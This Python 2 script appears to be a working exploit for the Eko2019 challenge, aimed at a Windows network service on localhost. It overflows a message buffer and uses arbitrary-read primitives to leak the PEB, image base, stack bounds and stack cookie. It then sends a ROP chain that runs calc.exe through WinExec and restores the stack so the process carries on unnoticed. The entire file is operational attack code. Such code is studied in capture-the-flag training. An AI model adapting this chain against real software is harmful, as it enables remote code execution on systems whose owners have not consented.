import struct

import socket
from contextlib import closing

TARGET_ADDRESS = ('127.0.0.1', 0xD431)


def get_header():
    header = ''
    header += 'Eko2019\x00'                     # Cookie
    header += struct.pack('<I', 0xffff0210)     # Size
    header += '\x00' * (16 - len(header))       # Padding
    return header


def send_user_message(sock, user_message):
    header = get_header()
    # Add alignment
    while len(user_message) % 8:
        user_message += 'A'

    packet = header + user_message
    sock.sendall(packet)


def recv_qword(sock):
    qword = sock.recv(8)
    return struct.unpack('<Q', qword)[0]


def get_content_of_teb(gs_offset):
    with closing(socket.socket()) as sock:
        user_message = ''
        user_message += 'A' * 0x200                     # User message
        user_message += '\x65\x00\x00\x00'              # mov rax, qword ptr gs:[rcx]; ret
        user_message += 'A' * 4                         # Padding
        user_message += struct.pack('<Q', gs_offset)    # Value of rcx

        sock.connect(TARGET_ADDRESS)
        send_user_message(sock, user_message)
        content_of_teb = recv_qword(sock)

        return content_of_teb


def get_content_of_address(address):
    with closing(socket.socket()) as sock:
        user_message = ''
        user_message += 'A' * 0x200                 # User message
        user_message += '\x90\x00\x00\x00'          # nop; mov rax, qword ptr [rcx]; ret
        user_message += 'A' * 4                     # Padding
        user_message += struct.pack('<Q', address)  # Value of rcx

        sock.connect(TARGET_ADDRESS)
        send_user_message(sock, user_message)
        content_of_address = recv_qword(sock)

        return content_of_address


def get_rsp_to_restore(stack_base, stack_limit, image_base_address):
    for address in xrange(stack_base, stack_limit, -8):
        content_of_address = get_content_of_address(address)
        if content_of_address == image_base_address + 0x155a:
            # If we found the return address in the stack, get the value of rsp ^ security_cookie
            rsp_xor_security_cookie = get_content_of_address(address - 0x18)
            security_cookie = get_content_of_address(image_base_address + 0xC240)
            rsp_to_restore = security_cookie ^ rsp_xor_security_cookie
            return rsp_to_restore
    raise Exception('Unable to determine RSP to restore')


def execute_calc(image_base_address, rsp_to_restore):
    with closing(socket.socket()) as sock:
        user_message = ''
        user_message += 'A' * 0x10

        # Write "calc" in the .data section
        user_message += struct.pack('<Q', image_base_address + 0x1991)  # pop rdi; ret;
        user_message += struct.pack('<Q', image_base_address + 0xFFF8)  # Address in the end of .data section
        user_message += struct.pack('<Q', image_base_address + 0x1167)  # pop rax; ret;
        user_message += 'calc\x00\x00\x00\x00'
        user_message += struct.pack('<Q', image_base_address + 0x16f9)  # pop rbx; ret;
        user_message += struct.pack('<Q', image_base_address + 0x8789)  # add rsp, 0x10; ret;
        user_message += struct.pack('<Q', image_base_address + 0x323c)  # mov qword ptr [rdi], rax; call rbx;

        # Set address of "calc" as value for rcx (lpCmdLine parameter of WinExec function)
        user_message += 'A' * 0x8
        user_message += struct.pack('<Q', image_base_address + 0x16f9)  # pop rbx; ret;
        user_message += struct.pack('<Q', image_base_address + 0xFFF8)  # Address of "calc" in the .data section
        user_message += struct.pack('<Q', image_base_address + 0x1167)  # pop rax; ret;
        user_message += struct.pack('<Q', image_base_address + 0x4A0D)  # pop r12; ret;
        user_message += struct.pack('<Q', image_base_address + 0x284a)  # mov rcx, rbx; call rax;

        # Set 0x0000000000000001 (SW_SHOWNORMAL) as value for rdx (uCmdShow parameter of WinExec function)
        user_message += struct.pack('<Q', image_base_address + 0x4a09)  # pop r15; pop r13; pop r12; ret;
        user_message += struct.pack('<Q', 0x0)
        user_message += struct.pack('<Q', 0x1)
        user_message += struct.pack('<Q', 0x0)
        user_message += struct.pack('<Q', image_base_address + 0x1167)  # pop rax; ret;
        user_message += struct.pack('<Q', image_base_address + 0x16f9)  # pop rbx; ret;
        user_message += struct.pack('<Q', image_base_address + 0x1b83)  # mov rdx, r13; add rax, r15; call rax;

        # Jump to the WinExec function
        user_message += struct.pack('<Q', image_base_address + 0x7269)  # pop rsi; ret;
        user_message += struct.pack('<Q', image_base_address + 0x8faa)
        user_message += struct.pack('<Q', image_base_address + 0x7984)  # jmp qword ptr [rsi + 0x66];

        # Set the return value (extra check to verify that the exploitation was successful)
        user_message += struct.pack('<Q', image_base_address + 0x11d5)  # add rsp, 0x28; ret;
        user_message += 'A' * 0x28
        expected_return_value = 0xcafecafedeaddead
        user_message += struct.pack('<Q', image_base_address + 0x1167)  # pop rax; ret;
        user_message += struct.pack('<Q', expected_return_value)

        # Restore the value of rsp and continue with the execution as if nothing happened
        user_message += struct.pack('<Q', image_base_address + 0x1fd7)  # pop rsp; ret;
        user_message += struct.pack('<Q', rsp_to_restore - 0x8)

        user_message += 'A' * (0x200 - len(user_message))
        user_message += '\x51\x00\x00\x00'                              # push rcx; mov rax, qword ptr [rcx]; ret
        user_message += 'A' * 4                                         # Padding
        user_message += struct.pack('<Q', image_base_address + 0x158b)  # Value of rcx (add rsp, 0x78; ret;)

        sock.connect(TARGET_ADDRESS)
        send_user_message(sock, user_message)
        return_value = recv_qword(sock)

        assert return_value == expected_return_value


def check_process_continuation(image_base_address):
    image_base_address_content = get_content_of_address(image_base_address)
    assert image_base_address_content == 0x300905a4d


def main():
    peb_address = get_content_of_teb(0x60)
    print '[+] PEB address: 0x{:02X}'.format(peb_address)

    image_base_address = get_content_of_address(peb_address + 0x10)
    print '[+] Image base address: 0x{:02X}'.format(image_base_address)

    stack_limit = get_content_of_teb(0x10)
    print '[+] Stack limit: 0x{:02X}'.format(stack_limit)

    stack_base = get_content_of_teb(0x8)
    print '[+] Stack base: 0x{:02X}'.format(stack_base)

    rsp_to_restore = get_rsp_to_restore(stack_base, stack_limit, image_base_address)
    print '[+] RSP to restore: 0x{:02X}'.format(rsp_to_restore)

    print '[+] Executing calc.exe'
    execute_calc(image_base_address, rsp_to_restore)

    print '[+] Checking process continuation'
    check_process_continuation(image_base_address)


if __name__ == '__main__':
    main()
